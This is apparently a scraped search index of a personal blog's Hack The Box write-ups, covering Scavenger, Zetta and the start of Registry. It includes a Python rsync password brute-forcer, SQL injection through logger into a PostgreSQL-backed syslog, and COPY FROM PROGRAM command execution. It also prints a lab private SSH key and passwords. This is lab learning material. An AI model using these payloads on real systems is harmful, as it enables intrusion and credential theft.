Jan 30 2019 access.txt -rw-r--r-- 1 1001 1004 68175351 Dec 07 2018 prestashop_1.7.4.4.zip -rw-r----- 1 0 1004 33 Dec 07 2018 user.txt drwxr-xr-x 26 1001 1004 4096 Dec 10 2018 www 226 Directory send OK. While doing enumeration it would be better if you analyze/use the files which was found before. So I analyzed .pcap file with wireshark and got file root.c . Wireshark: File-\u003eExport Objects-\u003eHTTP Then, I downloaded it in my local machine. You can get file here root.c. After analyzing this file I noticed that it is Kernel Rootkit. There is a saying \"Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree\" and found really good source for it you can visit here: detail. LKM-\u003e ‘magic’-\u003e Root After reading above blog I noticed that I should had root.ko file and a word magic. At first, I searched for word magic in root.c file and got g0tR0ot. I tried with that word in browser from previous user ib01c03with payload as and got same user so word magic was changed. For that I searched that word in every part of home dir of ib01c01 and found old school way of","date":"2020-02-29","objectID":"/scavenger/:3:2","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Alternative Method to Root ","date":"2020-02-29","objectID":"/scavenger/:4:0","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Reverse Engineering Though I got the root from simple way and I tried other way to get root. As root.ko file was ELF file and I love reversing the ELF file so I analyzed using my latest favorite tool ghidra. I opened it using ghidra if you are unfamiliar with ghidra tool you can see more about it here: ghidra. From the analysis of file root.c word magic was in function root_write(). So I checked that function in ghidra and got below as result. There I saw three variables as local_31 local_2d local_28 which was defined already. But these variable was defined in little Indian format. If you are unfamiliar with this format then don’t worry I will explain in my next blog. local_31 = 0x743367; # g3t local_2d = 0x76317250; # Pr1v local_28 = 0x746f3052743067; # g0tR0ot And on analyzing more about that function I got something fishy in snprintf((char *)\u0026local_28,8,\"%s%s\",\u0026local_31,\u0026local_2d);. In the above function from ghidra I found that value of local_28 is replaced with local_31+local_2d. If you are unfamiliar about snprintf function you can visit here snprintf. So my final magic word was g3tPr1v. Using this as above in browser, I got the root.txt file. This way I got the root of scavenger box and learned alot from this box. So I would like to thank creator of this box ompamo for such an awesome box. Especially enumeration, enumeration and enumeration was awesome. I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. Feedback are really appreciated !! Tweet about this writeup if you like. You can see more blog at my medium here: gr4n173. ","date":"2020-02-29","objectID":"/scavenger/:4:1","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Here I will explain my path for Zetta box from Hack The Box.","date":"2020-02-22","objectID":"/zetta/","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Zetta box was the hardes box till I have done. It falls under linux and hard category. Here I will explain my path for Zetta box from the Hack The Box. HTB:Zetta Zetta box was the hardest box till I have done. It falls under linux and hard category. Especially to read the root flag is a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using ipv6 and rsync service by uploading my authorized_keys then I used postgres along with logger to read root.txt .I’ll show all my payload(including that didn’t work in initial deployment to get the root). ","date":"2020-02-22","objectID":"/zetta/:0:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Box Details Description of the boxdescription of the box \" Description of the box In above picture it’s ip is 10.10.10.156, I added it to /etc/hosts as zetta.htb. Let’s solve this box. ","date":"2020-02-22","objectID":"/zetta/:1:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Recon Let’s start with our universal port scanner nmap to see the open port and service which shows FTP(TCP 21),SSH(TCP 22) and HTTP(TCP 80). root@gr4n173:~$ nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.156 Nmap 7.80 scan initiated Sat Jan 25 22:29:29 2020 as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.156 Nmap scan report for zetta.htb (10.10.10.156) Host is up (0.29s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Pure-FTPd 22/tcp open ssh OpenSSH 7.9p1 Debian 10 (protocol 2.0) | ssh-hostkey: | 2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA) | 256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA) |_ 256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519) 80/tcp open http nginx |_http-title: Ze::a Share Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Sat Jan 25 22:30:28 2020 -- 1 IP address (1 host up) scanned in 59.55 seconds ","date":"2020-02-22","objectID":"/zetta/:2:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Web Enumeration zetta.htb After I noticed port 80 http opened I visited that site and got this as output. Front PageFront Page \" Front Page Then, I searched every part of this website and found something interesting things in STUFF TO DO Native FTP We support native FTP with FXP enabled. We also support RFC2428. and also the credentials username/password for FTP service as below. ![Details of FTP](public/images/ftp_details.jpg “Details of FTP) ","date":"2020-02-22","objectID":"/zetta/:2:1","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"FTP With this detail I m into the FTP server now as. root@gr4n173:~$ ftp zetta.htb Connected to zetta.htb. 220---------- Welcome to Pure-FTPd [privsep] [TLS] ---------- 220-You are user number 1 of 500 allowed. 220-Local time is now 08:23. Server port: 21. 220-This is a private system - No anonymous login 220-IPv6 connections are also welcome on this server. 220 You will be disconnected after 15 minutes of inactivity. Name (zetta.htb:bikram): b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP 331 User b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP OK. Password required Password: 230-This server supports FXP transfers 230-OK. Current restricted directory is 230-0 files used (0%) - authorized: 10 files 230 0 Kbytes used (0%) - authorized: 1024 Kb Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e here you can see FXP transfers supports so I used this and got IPV6 from IPV4. If you are familiar with this then you can skip this blog but if you are unknown about this IPV6 and want to know how I got that then you can have a look at this RFC2428. At first I had set tcpdump listner as root@gr4n173:~$tcpdump -lni tun0 -vvvvvvvv ip6 tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes Now using this commands:- ftp\u003e quote EPRT |1|10.10.10.156|2222| 200-FXP transfer: from 10.10.16.25 to 10.10.10.156 200 PORT command successful ftp\u003e quote EPRT |2|2001:41d0:52:a00::e66|2222| 200-FXP transfer: from 10.10.10.156 to 2001:41d0:52:a00::e66%176 200 PORT command successful ftp\u003e quote EPRT |1|10.10.10.156|2222| 200-FXP transfer: from 2001:41d0:52:a00::e66%176 to 10.10.10.156 200 PORT command successful ftp\u003e quote EPRT |2|dead:beef:2::11df|2222| 200-FXP transfer: from 10.10.10.156 to dead:beef:2::11df%160 200 PORT command successful ftp\u003e LIST ?Invalid command ftp\u003e quote LIST 425 Could not open data connection to port 2222: Connection refused ftp\u003e from first command quote EPRT |1|10.10.10.156|2222| quote EPRT |2|2001:41d0:52:a00::e66|2222| this specifies server should use IPV4 to open a data connection to host of zetta.htb on port 2222 and similar for second command IP6 . Now in third command IPV4 is activated again and IPV6 of my own ip which I got from ifconfig is used. This was I got IPV6 as dead:beef::250:56ff:febd:a9a4 root@gr4n173:~$ tcpdump -lni tun0 -vvvvvvvv ip6 tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes 21:57:25.140243 IP6 (flowlabel 0x924d3, hlim 63, next-header TCP (6) payload length: 40) dead:beef::250:56ff:febd:a9a4.51208 \u003e dead:beef:2::11df.2222: Flags [S], cksum 0x9b6f (correct), seq 2652376284, win 28800, options [mss 1337,sackOK,TS val 1847133177 ecr 0,nop,wscale 7], length 0 21:57:25.140287 IP6 (flowlabel 0x55bf9, hlim 64, next-header TCP (6) payload length: 20) dead:beef:2::11df.2222 \u003e _dead:beef::250:56ff:febd:a9a4_.51208: Flags [R.], cksum 0xe556 (correct), seq 0, ack 2652376285, win 0, length 0 I pinged to this IPV6 and I got pinged back which indicates it was working fine. Now I tried again with nmap for IPV6 and got this with rsync service at port 8730 as root@gr4n173:~$nmap -sV -sC -6 dead:beef::250:56ff:febd:a9a4 -p 1-10000 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 22:23 +0545 Nmap scan report for dead:beef::250:56ff:febd:a9a4 Host is up (0.28s latency). Not shown: 9996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Pure-FTPd 22/tcp open ssh OpenSSH 7.9p1 Debian 10 (protocol 2.0) | ssh-hostkey: | 2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA) | 256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA) |_ 256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519) 80/tcp open http nginx |_http-title: Ze::a Share 8730/tcp open rsync (protocol version 31) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | address-info: | IPv6 EUI-64: | MAC address: | address: 00:50:56:bd:a9:a4 |_ manuf: VMware Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 hos","date":"2020-02-22","objectID":"/zetta/:2:2","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Rsync-\u003e authorized_keys-\u003e User.txt I googled and read everything regarding the service rsync and made some script with nmap as root@gr4n173:~$ nmap -sV -6 --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 dead:beef::250:56ff:febd:a9a4 but this didn’t work though so I searched other way to get remote rsync to the server and finally this worked for me. root@gr4n173:~$rsync -av rsync://[dead:beef::250:56ff:febd:a9a4]:8730/etc/rsyncd.conf /tmp/rsyncd.conf ","date":"2020-02-22","objectID":"/zetta/:3:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Script in Python From here I got username roy now, I had to crack password of user roy. For that, I had wrote an script in python using pexpect to sending and receiving the files over socket. You can download script from here #!/bin/python3 import pexpect p=open('/usr/share/wordlists/rockyou.txt','r') for x in p: login = pexpect.spawn('rsync -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:a9a4]:8730/home_roy/.ssh ssh') login.expect('Password:') login.sendline(x) if \"auth failed on module\" not in login.read(): break else: print(x) from here I got the password of user roy as :- computer Now I tried to download the id_rsa key of roy user but that fails since roy didn’t have id_rsa key instead used my own authorized_keys to get the shell of user roy. root@gr4n173:~$rsync -rdt authorized_keys -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:7d3b]:8730/home_roy/.ssh Here now authorized_keys let me to shell of user roy and also I had used the user roy along with it’s password computer. ","date":"2020-02-22","objectID":"/zetta/:3:1","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Shell as roy Finally I got the shell of roy and got the user.txt as root@gr4n173:~$ ssh roy@zetta.htb Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64 Last login: Sat Feb 15 22:05:58 2020 from 10.10.14.193 roy@zetta:~$ whoami roy roy@zetta:~$ ls user.txt roy@zetta:~$ cat user.txt a575bdb************************* ","date":"2020-02-22","objectID":"/zetta/:4:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Postgresql Exploit After I got user.txt i.e. roy shell ,I found .tudu.xml file in home directory of roy where many to do list was written. ....... \u003ctodo done=\"no\" collapse=\"no\"\u003e \u003ctitle\u003eCheck postgresql log for errors after configuration\u003c/title\u003e \u003ctext\u003e \u003c/text\u003e \u003c/todo\u003e \u003ctodo done=\"yes\" collapse=\"no\"\u003e \u003ctitle\u003ePrototype/test DB push of syslog events\u003c/title\u003e \u003ctext\u003e \u003c/text\u003e \u003c/todo\u003e \u003ctodo done=\"no\" collapse=\"no\"\u003e \u003ctitle\u003eTesting\u003c/title\u003e \u003ctext\u003e \u003c/text\u003e \u003c/todo\u003e \u003ctodo done=\"no\" collapse=\"no\"\u003e \u003ctitle\u003eRework syslog configuration to push all events to the DB\u003c/title\u003e \u003ctext\u003e \u003c/text\u003e \u003c/todo\u003e \u003ctodo done=\"no\" collapse=\"no\"\u003e \u003ctitle\u003eFind/write GUI for syslog-db access/view\u003c/title\u003e \u003ctext\u003e ........ From above todo list I had to check postgresql log for errors, Hence it confirmed me to exploit log. After a lot of enumeration I found something fishy in /etc/rsyslog.d/.git where I found pgsql.conf but I wasn’t able to cat that file due to permission error. So I used other ways to read that file. For that I used git command since, there is .git repo in that directory as roy@zetta:/tmp$ cd /etc/rsyslog.d/ roy@zetta:/etc/rsyslog.d$ git clone /etc/rsyslog.d/.git /tmp/.git Cloning into '/tmp/.git'... done. roy@zetta:/etc/rsyslog.d$ ls -al /tmp/.git/ total 16 drwxr-xr-x 3 roy roy 4096 Feb 20 06:21 . drwxrwxrwt 11 root root 4096 Feb 20 06:21 .. drwxr-xr-x 8 roy roy 4096 Feb 20 06:21 .git -rw-r--r-- 1 roy roy 807 Feb 20 06:21 pgsql.conf Now I was able to cat that file and where the file indicates there is sql injection one of the template and gives more information about local logging. Logging was new for me so googled and collected information about it. If you have known about logging then you can escape this blog but if you are unknown about logging in syslog then you can click here. roy@zetta:/tmp/.git$ cat pgsql.conf ### Configuration file for rsyslog-pgsql ### Changes are preserved # https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html # Used default template from documentation/source but adapted table # name to syslog_lines so the Ruby on Rails application Maurice is # coding can use this as SyslogLine object. # template(name=\"sql-syslog\" type=\"list\" option.sql=\"on\") { constant(value=\"INSERT INTO syslog_lines (message, devicereportedtime) values ('\") property(name=\"msg\") constant(value=\"','\") property(name=\"timereported\" dateformat=\"pgsql\" date.inUTC=\"on\") constant(value=\"')\") } # load module module(load=\"ompgsql\") #Only forward local7.info for testing. local7.info action(type=\"ompgsql\" server=\"localhost\" user=\"postgres\" pass=\"test1234\" db=\"syslog\" template=\"sql-syslog\") Since there was sql in syslog postgres I tried to get the shell of postgres for that I used command as roy@zetta:/tmp/.git$ psql -d syslog psql: FATAL: role \"roy\" does not exist where -d, –dbname=DBNAME database name to connect to (default: “roy”) So,for that I tried to create the user roy using postgres, logger and sql injection so my payload was ","date":"2020-02-22","objectID":"/zetta/:4:1","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Logger -\u003e Sql -\u003e Superuser roy roy@zetta:~$ logger -p local7.info \"aaa',current_timestamp);CREATE USER roy; --\" roy@zetta:~$ psql -d syslog psql (11.4 (Debian 11.4-1)) Type \"help\" for help. syslog=\u003e After that, I created the user roy for syslog and used the postgres command to see what things are inside the syslog database. Since this box got postgres I googled for latest exploit of postgresql and got COPY FROM PROGRAM Command Execution vulnerability. For more info about it you can click here. And instead of using Metasploit I used the manual ways to exploit this vulnerability for that I used this blog here. On reading blogs to use COPY command user must be superuser only then I can exploit it. For that I changed the user roy to superuser as roy@zetta:~$ logger -p local7.info \"aaa',current_timestamp);ALTER USER roy WITH SUPERUSER; --\" Now I exploit the postgres and able to run the command injection in syslog database. At my first attempt I was interrupted and unable to run command in postgres but after 2nd/3rd attempt I used ($$)Dollar-quoting for escaping single quotes in postgres to exploit command injection. ","date":"2020-02-22","objectID":"/zetta/:5:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Command Injection -\u003e Postgres shell syslog=# CREATE TABLE RCE(RCE text); CREATE TABLE syslog=# COPY RCE FROM PROGRAM $$id$$; COPY 1 syslog=# SELECT * FROM RCE; rce ------------------------------------------------------------------------ postgres uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert) (2 rows) Now I have to get the postgres shell for that I should have id_rsa key. Now for that I found the id_rsa key of postgres in directory /var/lib/postgres/.ssh/ So for that I used that cat command in command injection and able to cat the RSA key. syslog=# COPY RCE FROM PROGRAM $$cat ../../.ssh/id_rsa$$; COPY 6 syslog=# SELECT * FROM RCE; rce ------------------------------------------------------------------------------ postgres uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert) /var/lib/postgresql/11/main total 20 drwxr-xr-x 4 postgres postgres 4096 Jul 27 2019 . drwxr-xr-x 27 root root 4096 Aug 27 05:39 .. drwxr-xr-x 3 postgres postgres 4096 Jul 27 2019 11 lrwxrwxrwx 1 root root 9 Jul 27 2019 .bash_history -\u003e /dev/null -rw------- 1 postgres postgres 744 Jul 27 2019 .psql_history drwx------ 2 postgres postgres 4096 Jul 27 2019 .ssh total 20 drwx------ 2 postgres postgres 4096 Jul 27 2019 . drwxr-xr-x 4 postgres postgres 4096 Jul 27 2019 .. -rw------- 1 postgres postgres 747 Jul 27 2019 authorized_keys -rw------- 1 postgres postgres 3389 Jul 27 2019 id_rsa -rw-r--r-- 1 postgres postgres 747 Jul 27 2019 id_rsa.pub -----BEGIN OPENSSH PRIVATE KEY----- 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 8h7HZk5","date":"2020-02-22","objectID":"/zetta/:6:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Postgres -\u003e Root Now I got the shell of user postgres and searched its home directory and got .psql_history. postgres@zetta:~$ cat .psql_history CREATE DATABASE syslog; \\c syslog CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL); \\d syslog_lines ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres'; and I have todo list from shell of roy .tudu.xml and got this. \u003ctodo done=\"no\" collapse=\"no\"\u003e \u003ctitle\u003eChange shared password scheme from \u0026lt;secret\u0026gt;@userid to something more secure.\u003c/title\u003e \u003ctext\u003e \u003c/text\u003e From above two notes: format of password of user posgres and todo list I made conclusion as password root should be sup3rs3cur3p4ass@root. Finally that worked and got the root shell and root.txt. postgres@zetta:~$ su root Password: root@zetta:/var/lib/postgresql# cd root@zetta:~# whoami root root@zetta:~# id uid=0(root) gid=0(root) groups=0(root) root@zetta:~# cat root.txt b9407e837fb**************** This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box jkr for such an awesome box. I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. Feedback are really appreciated !! Tweet about this writeup if you like. You can follow and see my blog in my medium profile: gr4n173. ","date":"2020-02-22","objectID":"/zetta/:7:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["moee"],"content":"This is my first vulnerable box ","date":"2020-11-22","objectID":"/moee-1/","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["moee"],"content":"Details about the first part of Moee Series. ","date":"2020-11-22","objectID":"/moee-1/:0:0","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["moee"],"content":"1 Download link You can download here: Moee-1. ","date":"2020-11-22","objectID":"/moee-1/:1:0","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["moee"],"content":"2 Details about Box You can visit this link from vulnhub to get the detail information about this box here. Below is the offical published tweet about it. Hello folks, Finally my box is published on @VulnHub and thanks vulnhub for making this public. You can check this out. Feedback is really appricated. At last but not least I would like to give a huge shout out to @DCAU7 for helping me this out. https://t.co/Ie69rVmhXz — gr4n173 (@gr4n173) December 2, 2020 ","date":"2020-11-22","objectID":"/moee-1/:2:0","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["hackthebox"],"content":"Here I will explain my path for Registry box from Hack The Box.","date":"2020-04-04","objectID":"/registery/","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Registry box was the hard box. It falls under linux and hard category.Especially to read the root flag was a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. ","date":"2020-04-04","objectID":"/registery/:0:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"HTB:Registry Registry box was the hard box. It falls under linux and hard category. Especially to read the root flag was a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting the docker registry page where I got the id_rsa key and password. For root, I got the www-data shell by exploiting CSRF TO RCE then with that shell I downloaded the backups files with restic-service and got a root.txt. I’ll show all my payload(including that didn’t work in initial deployment to get the root). ","date":"2020-04-04","objectID":"/registery/:1:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Box Details Details of Registry BoxDetails of Registry Box \" Details of Registry Box In the above picture it’s IP was 10.10.10.159 and added it to /etc/hosts as registry.htb. Let’s solve this box. ","date":"2020-04-04","objectID":"/registery/:2:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Recon Let’s start with our universal port scanner, nmap to see the open port and which shows port SSH(22), HTTP(TCP 80) and SSL(TCP 443). root@gr4n173:~$ nmap -sS -sV -sC -Pn -oA nmap.txt 10.10.10.159 # Nmap 7.80 scan initiated Thu Oct 24 22:03:45 2019 as: nmap -sS -sV -sC -Pn -oA nmap.txt 10.10.10.159 Nmap scan report for 10.10.10.159 Host is up (0.30s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA) | 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA) |_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Welcome to nginx! 443/tcp open ssl/http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Welcome to nginx! | ssl-cert: Subject: commonName=docker.registry.htb | Not valid before: 2019-05-06T21:14:35 |_Not valid after: 2029-05-03T21:14:35 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Oct 24 22:04:44 2019 -- 1 IP address (1 host up) scanned in 58.92 seconds ","date":"2020-04-04","objectID":"/registery/:3:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Web Enumeration registry.htb As soon as I saw port 80 opened I visited the site and got below as output. Now as usual for website I we usually searched for dir so I searched dirsearch tool as . root@gr4n173:~$ ./dirsearch.py -e html,txt,php,pcap,tar,bzip -u http://registry.htb/ -w ~/Downloads/wo rdlists/SecLists/Discovery/Web-Content/raft-large-directories.txt _|. _ _ _ _ _ _|_ v0.3.8 (_||| _) (/_(_|| (_| ) Extensions: html, txt, php, pcap, tar, bzip | Threads: 10 | Wordlist size: 62279 Error Log: /home/bikram/bbek/recon_tool/dirsearch/logs/errors-20-04-02_20-42-51.log Target: http://registry.htb/ [20:42:51] Starting: [20:42:54] 301 - 194B - /install -\u003e http://registry.htb/install/ [20:46:22] 200 - 612B - /bolt Task Completed and got the dir /bolt and /install. Fig: /bolt Fig: /install ","date":"2020-04-04","objectID":"/registery/:4:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Subdomain Enumeration As the given was http but looked over https too. In order to find the interesting things I usually use nikto tool. So I used it here too and got the subdomain as docker.registry.htb root@gr4n173:~$ nikto -h https://10.10.10.159 - 